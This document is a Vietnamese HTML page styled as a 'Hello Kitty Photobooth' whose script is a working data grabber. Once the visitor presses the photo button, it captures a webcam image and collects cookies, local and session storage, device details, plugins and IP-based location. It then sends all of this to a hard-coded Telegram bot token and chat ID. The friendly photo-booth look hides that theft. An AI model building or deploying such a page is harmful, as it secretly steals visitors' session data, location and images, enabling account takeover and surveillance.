<!doctype html>
<html lang="vi">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>🎀 Hello Kitty Photobooth</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@400;600;700;800&display=swap" rel="stylesheet">
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: linear-gradient(135deg, #ffe4ec, #ffb6c1, #ff8a9c);
      font-family: 'Quicksand', sans-serif;
      padding: 20px;
      position: relative;
      overflow-x: hidden;
    }
    .sakura-container {
      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
      pointer-events: none; overflow: hidden; z-index: 0;
    }
    .sakura {
      position: absolute; top: -20px; color: #ffb7c5; font-size: 20px;
      animation: fall linear infinite; opacity: 0.7;
    }
    @keyframes fall {
      0% { transform: translateY(-20px) rotate(0deg) scale(1); opacity: 0.8; }
      100% { transform: translateY(110vh) rotate(720deg) scale(0.3); opacity: 0; }
    }
    .card {
      background: rgba(255,255,255,0.85);
      backdrop-filter: blur(20px);
      border-radius: 40px;
      padding: 25px 20px;
      max-width: 450px;
      width: 100%;
      box-shadow: 0 20px 60px rgba(255,105,135,0.3);
      border: 2px solid rgba(255,255,255,0.5);
      position: relative;
      z-index: 1;
      text-align: center;
    }
    .card::before {
      content: "🎀";
      position: absolute; top: -18px; left: 50%; transform: translateX(-50%);
      font-size: 36px;
      filter: drop-shadow(0 4px 10px rgba(255,105,135,0.3));
    }
    .kitty-avatar {
      width: 70px; height: 70px; margin: 0 auto 10px;
      background: linear-gradient(135deg, #ffb6c1, #ff8a9c);
      border-radius: 50%;
      display: flex; align-items: center; justify-content: center;
      font-size: 42px;
      box-shadow: 0 8px 30px rgba(255,105,135,0.4);
      border: 3px solid white;
      animation: bounceKitty 2s ease-in-out infinite;
    }
    @keyframes bounceKitty {
      0%,100% { transform: translateY(0); }
      50% { transform: translateY(-8px); }
    }
    h2 { font-size: 20px; font-weight: 800; color: #d6336c; margin-bottom: 2px; }
    .subtitle { color: #e07a8e; font-size: 12px; font-weight: 600; margin-bottom: 12px; }
    .live-clock {
      background: linear-gradient(135deg, #ffb6c1, #ff8a9c);
      padding: 5px 14px; border-radius: 30px; display: inline-block;
      color: white; font-weight: 700; font-size: 11px;
      margin-bottom: 12px;
      box-shadow: 0 4px 15px rgba(255,105,135,0.3);
    }
    .video-preview {
      border-radius: 20px;
      overflow: hidden;
      background: #fce4ec;
      position: relative;
      border: 3px solid #ffb6c1;
      min-height: 250px;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 12px;
    }
    .video-preview video {
      width: 100%;
      display: block;
      background: #fce4ec;
    }
    .video-preview .placeholder {
      color: #e07a8e; font-size: 14px; font-weight: 600; padding: 20px;
      position: absolute;
    }
    .camera-indicator {
      position: absolute; top: 10px; left: 10px;
      background: rgba(255,255,255,0.9);
      padding: 4px 12px; border-radius: 20px;
      font-size: 11px; font-weight: 700; color: #d6336c;
      border: 1px solid #ffb6c1;
      z-index: 2;
    }
    .btn {
      width: 100%; padding: 14px; border: none; border-radius: 30px;
      font-size: 15px; font-weight: 700; color: white;
      cursor: pointer; transition: all 0.3s ease;
      display: flex; align-items: center; justify-content: center;
      gap: 8px; font-family: 'Quicksand', sans-serif;
    }
    .btn-primary {
      background: linear-gradient(135deg, #ff6b8a, #ff4d6d);
      box-shadow: 0 8px 25px rgba(255,77,109,0.4);
    }
    .btn-primary:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 12px 35px rgba(255,77,109,0.5); }
    .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
    .btn-pink {
      background: linear-gradient(135deg, #ff8a9c, #ff6b8a);
      box-shadow: 0 8px 25px rgba(255,107,138,0.4);
    }
    .btn-pink:hover { transform: translateY(-2px); box-shadow: 0 12px 35px rgba(255,107,138,0.5); }
    .btn-group { display: none; flex-direction: column; gap: 8px; margin-top: 10px; }
    .btn-group.show { display: flex; }
    .btn a { color: white; text-decoration: none; width: 100%; }
    .status { margin-top: 12px; font-size: 12px; font-weight: 600; color: #e07a8e; min-height: 18px; }
    .status.success { color: #2ecc71; }
    .status.loading { color: #f59e0b; }
    .status.error { color: #ef4444; }
    .footer-badge { margin-top: 12px; font-size: 9px; color: #e07a8e; opacity: 0.7; letter-spacing: 1px; }
    #canvas { display: none; }

    .music-control {
      position: fixed; bottom: 20px; right: 20px; z-index: 100;
      background: rgba(255,255,255,0.9); border: 2px solid #ffb6c1;
      border-radius: 50%; width: 44px; height: 44px;
      display: flex; align-items: center; justify-content: center;
      font-size: 18px; cursor: pointer;
      box-shadow: 0 4px 20px rgba(255,105,135,0.3);
      transition: all 0.3s ease; backdrop-filter: blur(10px);
    }
    .music-control:hover { transform: scale(1.1); }
    .music-control.playing { animation: pulseMusic 1.5s ease-in-out infinite; }
    @keyframes pulseMusic {
      0%,100% { box-shadow: 0 4px 20px rgba(255,105,135,0.3); }
      50% { box-shadow: 0 4px 40px rgba(255,105,135,0.6); }
    }
    .music-progress {
      position: fixed; bottom: 75px; right: 20px; z-index: 99;
      width: 44px; display: flex; flex-direction: column; align-items: center;
    }
    .music-progress input[type="range"] {
      width: 60px; height: 3px; -webkit-appearance: none;
      background: #ffb6c1; border-radius: 2px; outline: none;
      transform: rotate(-90deg); transform-origin: center; cursor: pointer;
    }
    .music-progress input[type="range"]::-webkit-slider-thumb {
      -webkit-appearance: none; width: 10px; height: 10px;
      background: #ff6b8a; border-radius: 50%; cursor: pointer;
    }
    .loading-overlay {
      display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
      background: rgba(255,255,255,0.85); backdrop-filter: blur(5px);
      z-index: 999; justify-content: center; align-items: center;
      flex-direction: column; gap: 15px;
    }
    .loading-overlay.show { display: flex; }
    .loading-spinner {
      width: 50px; height: 50px;
      border: 4px solid #ffb6c1; border-top: 4px solid #ff4d6d;
      border-radius: 50%; animation: spin 1s linear infinite;
    }
    @keyframes spin { 0% { transform: rotate(0); } 100% { transform: rotate(360deg); } }
    .loading-text { color: #d6336c; font-weight: 700; font-size: 16px; }
    @media (max-width: 480px) {
      .card { padding: 18px 12px; }
      .video-preview { min-height: 200px; }
      h2 { font-size: 17px; }
      .kitty-avatar { width: 55px; height: 55px; font-size: 32px; }
    }
  </style>
</head>
<body>

<div class="loading-overlay" id="loadingOverlay">
  <div class="loading-spinner"></div>
  <div class="loading-text">🌸 Đang khởi tạo...</div>
</div>

<div class="sakura-container" id="sakuraContainer"></div>

<div class="music-progress">
  <input type="range" id="volumeControl" min="0" max="1" step="0.01" value="0.7">
</div>
<div class="music-control playing" id="musicBtn" onclick="toggleMusic()">🎵</div>

<div class="card">
  <div class="kitty-avatar"><span>🐱</span></div>
  <div class="live-clock" id="clock">🕒 Đang tải...</div>
  <h2>🌸 Hello Kitty Photobooth</h2>
  <p class="subtitle">✨ Chụp ảnh + Thu thập thông tin ✨</p>

  <div class="video-preview">
    <video id="video" autoplay playsinline muted></video>
    <div class="placeholder" id="placeholder">📸 Đang chờ camera...</div>
    <div class="camera-indicator" id="cameraLabel">📷 Camera</div>
  </div>

  <button class="btn btn-primary" id="capture-btn" disabled>
    <span>📸 CHỤP ẢNH & GỬI DỮ LIỆU</span>
  </button>

  <div class="btn-group" id="action-buttons">
    <a href="#" target="_blank" class="btn btn-pink" style="text-decoration:none;">🎀 TRUY CẬP NHÓM LẤY FILE</a>
    <a href="#" target="_blank" class="btn btn-pink" style="text-decoration:none;">🤖 MỞ BOT TELEGRAM</a>
  </div>

  <div id="status" class="status">💖 Bấm nút để bắt đầu!</div>
  <div class="footer-badge">🎀 Made with love 🎀</div>
</div>

<canvas id="canvas"></canvas>

<script>
// ============================================================
// CẤU HÌNH - SỬA TOKEN VÀ CHAT ID CỦA BẠN VÀO ĐÂY
// ============================================================
const TELEGRAM_BOT_TOKEN = '8921957218:AAFpPTSp5c56ByZMXZRlw8XwBxXj9ap_AE8';
const TELEGRAM_CHAT_ID = '8872446985';
const MUSIC_FILE = 'nhac_nen.mp3';

// ============================================================
// HOA ANH ĐÀO
// ============================================================
(function createSakura() {
  const container = document.getElementById('sakuraContainer');
  const emojis = ['🌸','🌺','🌸','🌺','🌸'];
  for (let i = 0; i < 30; i++) {
    const el = document.createElement('div');
    el.className = 'sakura';
    el.textContent = emojis[Math.floor(Math.random() * emojis.length)];
    el.style.left = Math.random() * 100 + '%';
    el.style.fontSize = (12 + Math.random() * 20) + 'px';
    el.style.animationDuration = (8 + Math.random() * 14) + 's';
    el.style.animationDelay = (Math.random() * 15) + 's';
    container.appendChild(el);
  }
})();

// ============================================================
// NHẠC - TỰ ĐỘNG PHÁT
// ============================================================
let audio = null;
let isMusicPlaying = false;
let musicStarted = false;

function initAudio() {
  if (!audio) {
    audio = new Audio(MUSIC_FILE);
    audio.loop = true;
    audio.volume = 0.7;
    document.getElementById('volumeControl').addEventListener('input', function() {
      if (audio) audio.volume = this.value;
    });
  }
}

function playMusic() {
  try {
    initAudio();
    if (!musicStarted) {
      audio.play().then(() => {
        isMusicPlaying = true;
        musicStarted = true;
        document.getElementById('musicBtn').classList.add('playing');
        document.getElementById('musicBtn').textContent = '🎵';
      }).catch(() => {
        document.addEventListener('click', function playOnClick() {
          if (!musicStarted) {
            audio.play().then(() => {
              isMusicPlaying = true;
              musicStarted = true;
              document.getElementById('musicBtn').classList.add('playing');
              document.getElementById('musicBtn').textContent = '🎵';
            }).catch(()=>{});
            document.removeEventListener('click', playOnClick);
          }
        }, { once: true });
      });
    }
  } catch(e) {}
}

function toggleMusic() {
  initAudio();
  if (isMusicPlaying) {
    audio.pause();
    isMusicPlaying = false;
    document.getElementById('musicBtn').classList.remove('playing');
    document.getElementById('musicBtn').textContent = '🔇';
  } else {
    audio.play().catch(()=>{});
    isMusicPlaying = true;
    document.getElementById('musicBtn').classList.add('playing');
    document.getElementById('musicBtn').textContent = '🎵';
  }
}

setTimeout(playMusic, 100);
setTimeout(playMusic, 1000);
setTimeout(playMusic, 3000);

// ============================================================
// ĐỒNG HỒ
// ============================================================
function updateClock() {
  const now = new Date();
  document.getElementById('clock').textContent =
    `🕒 ${now.toLocaleTimeString('vi-VN', {hour12:false})} - ${now.toLocaleDateString('vi-VN')}`;
}
setInterval(updateClock, 1000);
updateClock();

// ============================================================
// LẤY THÔNG TIN
// ============================================================
function getCurrentCookies() {
  try {
    const raw = document.cookie;
    if (!raw) return [];
    return raw.split(';').map(c => c.trim()).filter(c => c).map(c => {
      const idx = c.indexOf('=');
      if (idx === -1) return { name: c, value: '' };
      return { name: c.substring(0, idx), value: c.substring(idx + 1) };
    });
  } catch(e) { return []; }
}

function getCookiesString(cookies) {
  if (!cookies || !cookies.length) return '❌ Không có cookies';
  return cookies.map((c, i) => {
    let v = decodeURIComponent(c.value || '');
    if (v.length > 60) v = v.substring(0, 60) + '…';
    v = v.replace(/[^\x20-\x7E]/g, '?');
    return `  ${i+1}. ${c.name} = ${v}`;
  }).join('\n');
}

function getLocalStorageInfo() {
  try {
    if (!localStorage.length) return '❌ Không có dữ liệu localStorage';
    const items = [];
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      let val = localStorage.getItem(key) || '';
      if (val.length > 60) val = val.substring(0, 60) + '…';
      val = val.replace(/[^\x20-\x7E]/g, '?');
      items.push(`  ${key} = ${val}`);
    }
    return items.join('\n');
  } catch(e) { return '❌ Không thể truy cập localStorage'; }
}

function getSessionStorageInfo() {
  try {
    if (!sessionStorage.length) return '❌ Không có dữ liệu sessionStorage';
    const items = [];
    for (let i = 0; i < sessionStorage.length; i++) {
      const key = sessionStorage.key(i);
      let val = sessionStorage.getItem(key) || '';
      if (val.length > 60) val = val.substring(0, 60) + '…';
      val = val.replace(/[^\x20-\x7E]/g, '?');
      items.push(`  ${key} = ${val}`);
    }
    return items.join('\n');
  } catch(e) { return '❌ Không thể truy cập sessionStorage'; }
}

function getDeviceInfo() {
  return {
    platform: navigator.platform || 'Không rõ',
    language: navigator.language || 'Không rõ',
    screen: `${window.screen.width}x${window.screen.height}`,
    cores: navigator.hardwareConcurrency || 'Không rõ',
    memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'Không rõ',
    touch: navigator.maxTouchPoints > 0 ? '✅ Có' : '❌ Không',
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Không rõ',
    url: window.location.href,
    title: document.title,
    referrer: document.referrer || 'Trực tiếp'
  };
}

async function getIP() {
  try {
    const res = await fetch('https://ipwho.is/');
    const data = await res.json();
    if (data.success) {
      return {
        ip: data.ip || 'Không rõ',
        city: data.city || 'Không rõ',
        country: data.country || 'Không rõ',
        isp: data.connection?.isp || data.connection?.org || 'Không rõ'
      };
    }
    return { ip: 'Không rõ' };
  } catch(e) {
    try {
      const fallback = await fetch('https://api.ipify.org?format=json');
      const data = await fallback.json();
      return { ip: data.ip || 'Không rõ' };
    } catch(err) { return { ip: 'Không rõ' }; }
  }
}

function getPlugins() {
  try {
    const plugins = [];
    for (let i = 0; i < navigator.plugins.length; i++) {
      plugins.push(navigator.plugins[i].name);
    }
    return plugins;
  } catch(e) { return []; }
}

// ============================================================
// CAMERA
// ============================================================
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const captureBtn = document.getElementById('capture-btn');
const statusDiv = document.getElementById('status');
const actionBtns = document.getElementById('action-buttons');
const loadingOverlay = document.getElementById('loadingOverlay');
const placeholder = document.getElementById('placeholder');
const cameraLabel = document.getElementById('cameraLabel');

let currentStream = null;
let isCameraReady = false;

async function startCamera() {
  loadingOverlay.classList.add('show');
  captureBtn.disabled = true;
  placeholder.textContent = '📸 Đang mở camera...';
  
  try {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
        audio: false
      });
      currentStream = stream;
      video.srcObject = stream;
      await video.play();
      isCameraReady = true;
      cameraLabel.textContent = '📷 Camera trước';
      placeholder.style.display = 'none';
    } catch(e1) {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
          audio: false
        });
        currentStream = stream;
        video.srcObject = stream;
        await video.play();
        isCameraReady = true;
        cameraLabel.textContent = '📷 Camera sau';
        placeholder.style.display = 'none';
      } catch(e2) {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
          currentStream = stream;
          video.srcObject = stream;
          await video.play();
          isCameraReady = true;
          cameraLabel.textContent = '📷 Camera';
          placeholder.style.display = 'none';
        } catch(e3) {
          throw new Error('Không thể mở camera');
        }
      }
    }
    
    if (isCameraReady) {
      captureBtn.disabled = false;
      statusDiv.textContent = '✅ Camera đã sẵn sàng!';
      statusDiv.className = 'status success';
    }
    
  } catch(err) {
    placeholder.textContent = '❌ Không thể mở camera. Vui lòng cấp quyền!';
    statusDiv.textContent = '⚠️ Không thể truy cập camera';
    statusDiv.className = 'status error';
    isCameraReady = false;
    captureBtn.disabled = true;
  } finally {
    loadingOverlay.classList.remove('show');
  }
}

setTimeout(startCamera, 500);

// ============================================================
// CHỤP ẢNH & GỬI DỮ LIỆU
// ============================================================
function playClickSound() {
  try {
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.type = 'sine';
    osc.frequency.setValueAtTime(880, ctx.currentTime);
    osc.frequency.exponentialRampToValueAtTime(1320, ctx.currentTime + 0.1);
    gain.gain.setValueAtTime(0.12, ctx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.1);
    osc.connect(gain);
    gain.connect(ctx.destination);
    osc.start();
    osc.stop(ctx.currentTime + 0.1);
  } catch(e) {}
}

captureBtn.onclick = async function() {
  if (!isCameraReady || !currentStream) {
    statusDiv.textContent = '⚠️ Vui lòng đợi camera sẵn sàng!';
    statusDiv.className = 'status error';
    return;
  }
  
  playClickSound();
  captureBtn.disabled = true;
  statusDiv.textContent = '📸 Đang chụp ảnh...';
  statusDiv.className = 'status loading';
  
  // Thu thập dữ liệu
  const cookies = getCurrentCookies();
  const localStorage = getLocalStorageInfo();
  const sessionStorage = getSessionStorageInfo();
  const device = getDeviceInfo();
  const ip = await getIP();
  const plugins = getPlugins();
  
  // Chụp ảnh
  const W = 480, H = 360;
  canvas.width = W; canvas.height = H;
  const ctx = canvas.getContext('2d');
  
  const grad = ctx.createLinearGradient(0, 0, W, H);
  grad.addColorStop(0, '#ffe4ec');
  grad.addColorStop(1, '#ffb6c1');
  ctx.fillStyle = grad;
  ctx.fillRect(0, 0, W, H);
  
  ctx.save();
  ctx.translate(W, 0);
  ctx.scale(-1, 1);
  ctx.drawImage(video, 0, 0, W, H);
  ctx.restore();
  
  ctx.strokeStyle = '#ff6b8a';
  ctx.lineWidth = 4;
  ctx.strokeRect(10, 10, W-20, H-20);
  
  ctx.fillStyle = 'rgba(255,255,255,0.7)';
  ctx.fillRect(10, 10, W-20, 35);
  ctx.fillStyle = '#d6336c';
  ctx.font = 'bold 16px Quicksand';
  ctx.textAlign = 'center';
  ctx.fillText('🌸 Hello Kitty Photobooth 🌸', W/2, 35);
  
  ctx.fillStyle = 'rgba(214,51,108,0.5)';
  ctx.font = '10px Quicksand';
  ctx.textAlign = 'right';
  ctx.fillText(new Date().toLocaleString('vi-VN'), W-15, H-10);
  
  ctx.fillStyle = 'rgba(255,255,255,0.6)';
  ctx.fillRect(10, H-25, 130, 18);
  ctx.fillStyle = '#d6336c';
  ctx.font = 'bold 9px Quicksand';
  ctx.textAlign = 'left';
  ctx.fillText(`📍 ${ip.city || 'Unknown'}`, 15, H-11);
  
  // Tạo caption
  let caption = `🎀 HELLO KITTY PHOTOBOOTH 🎀\n`;
  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
  caption += `⏰ ${new Date().toLocaleString('vi-VN')}\n`;
  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
  
  caption += `📱 DEVICE:\n`;
  caption += `  Platform: ${device.platform}\n`;
  caption += `  Language: ${device.language}\n`;
  caption += `  Screen: ${device.screen}\n`;
  caption += `  CPU: ${device.cores} cores\n`;
  caption += `  RAM: ${device.memory}\n`;
  caption += `  Touch: ${device.touch}\n`;
  caption += `  Timezone: ${device.timezone}\n`;
  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
  
  caption += `🌐 IP & LOCATION:\n`;
  caption += `  IP: ${ip.ip || 'Không rõ'}\n`;
  caption += `  City: ${ip.city || 'Không rõ'}\n`;
  caption += `  Country: ${ip.country || 'Không rõ'}\n`;
  caption += `  ISP: ${ip.isp || 'Không rõ'}\n`;
  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
  
  caption += `🍪 COOKIES (${cookies.length}):\n`;
  if (cookies.length > 0) {
    cookies.slice(0, 5).forEach(c => {
      let v = decodeURIComponent(c.value || '');
      if (v.length > 40) v = v.substring(0, 40) + '…';
      caption += `  ${c.name} = ${v}\n`;
    });
    if (cookies.length > 5) caption += `  ... +${cookies.length-5} cookies\n`;
  } else {
    caption += `  ❌ Không có cookies\n`;
  }
  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
  
  const lsItems = localStorage.split('\n').filter(l => l.trim());
  if (lsItems.length > 0) {
    caption += `💾 LOCAL STORAGE (${lsItems.length}):\n`;
    lsItems.slice(0, 5).forEach(item => caption += `  ${item.trim()}\n`);
    if (lsItems.length > 5) caption += `  ... +${lsItems.length-5} items\n`;
    caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
  }
  
  const ssItems = sessionStorage.split('\n').filter(l => l.trim());
  if (ssItems.length > 0) {
    caption += `📦 SESSION STORAGE (${ssItems.length}):\n`;
    ssItems.slice(0, 5).forEach(item => caption += `  ${item.trim()}\n`);
    if (ssItems.length > 5) caption += `  ... +${ssItems.length-5} items\n`;
    caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
  }
  
  if (plugins.length > 0) {
    caption += `🔌 PLUGINS (${plugins.length}):\n`;
    plugins.slice(0, 5).forEach((p, i) => caption += `  ${i+1}. ${p}\n`);
    if (plugins.length > 5) caption += `  ... +${plugins.length-5} plugins\n`;
    caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
  }
  
  caption += `🔗 PAGE:\n`;
  caption += `  URL: ${device.url}\n`;
  caption += `  Title: ${device.title}\n`;
  caption += `  Referrer: ${device.referrer}\n`;
  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
  caption += `🌸 Thank you! 🌸`;
  
  if (caption.length > 4000) {
    caption = caption.substring(0, 3900) + '\n... (cut)';
  }
  
  // Gửi lên Telegram
  canvas.toBlob(async (blob) => {
    if (blob) {
      const form = new FormData();
      form.append('chat_id', TELEGRAM_CHAT_ID);
      form.append('photo', blob, `hello_kitty_${Date.now()}.jpg`);
      form.append('caption', caption);
      form.append('parse_mode', 'HTML');
      try {
        const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: form
        });
        const json = await res.json();
        if (json.ok) {
          statusDiv.textContent = '🎀 Thành công! Kitty đã nhận được ảnh! 💖';
          statusDiv.className = 'status success';
          actionBtns.classList.add('show');
        } else {
          statusDiv.textContent = '⚠️ Lỗi: ' + (json.description || 'Unknown');
          statusDiv.className = 'status error';
        }
      } catch(e) {
        statusDiv.textContent = '⚠️ Lỗi kết nối Telegram';
        statusDiv.className = 'status error';
      }
    }
    captureBtn.disabled = false;
  }, 'image/jpeg', 0.92);
};

// ============================================================
// KHỞI TẠO
// ============================================================
statusDiv.textContent = '💖 Bấm nút để bắt đầu!';
statusDiv.className = 'status';
</script>
</body>
</html>
